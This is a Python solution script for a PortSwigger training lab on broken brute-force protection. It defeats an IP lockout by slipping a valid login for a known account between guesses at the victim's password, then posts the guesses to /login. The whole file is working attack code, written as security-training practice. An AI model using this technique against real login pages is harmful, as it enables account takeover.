import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def print_lab_info(url):
    info = f"""
+{'='*70}+

 PortSwigger Lab: Authentication vulnerabilities
 Challenge: Broken brute-force protection, IP block
 Target: {url}
 
 Lab Description:
  This lab is vulnerable due to a logic flaw in its password brute-force protection. 
  To solve the lab, brute-force the victim's password, then log in and access their account page.

  Your credentials: wiener:peter
  Victim's username: carlos
  Candidate passwords (./list/password.txt)

+{'='*70}+
"""
    print(info)

def createList() :
    with open("./list/password.txt") as p_file :
        passwords = [p.strip() for p in p_file]
    newUsernameList = []
    newPasswordList = []
    
    newUsernameList.append("wiener")
    newPasswordList.append("peter")
    for i in range(len(passwords)) :
        newUsernameList.append("carlos")
        newPasswordList.append(passwords[i])

        if (i + 1) % 2 == 0:
            newUsernameList.append("wiener")
            newPasswordList.append("peter")
    
    # Burp Suite 실습을 위한 파일.    
    with open("./list/new_username.txt", "w") as u_file:
        for username in newUsernameList:
            u_file.write(username + "\n")

    with open("./list/new_password.txt", "w") as p_file:
        for password in newPasswordList:
            p_file.write(password + "\n")
            
def exploit_broken_brute_force_protection_ip_block(url) :
    
    login_url = url + "/login"
    
    with open("./list/new_username.txt") as u_file, open("./list/new_password.txt") as p_file :
        usernames = [u.strip() for u in u_file]
        passwords = [p.strip() for p in p_file]
        
    for i in range(len(usernames)) :
        login_data = {"username" : usernames[i], "password" : passwords[i]}
        response = requests.post(login_url, data=login_data, allow_redirects=False, verify=False)
        if usernames[i] != "wiener" and response.status_code == 302 :
            print(f"[🎉] Exploit Success => username: {usernames[i]}, password: {passwords[i]}")  
            return
        
    print("[🧨] Exploit Failed")   

def main() :
    if len(sys.argv) != 2 :
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        
    url = sys.argv[1]
    print_lab_info(url)
    createList()
    exploit_broken_brute_force_protection_ip_block(url)
    
if __name__ == "__main__" :
    main()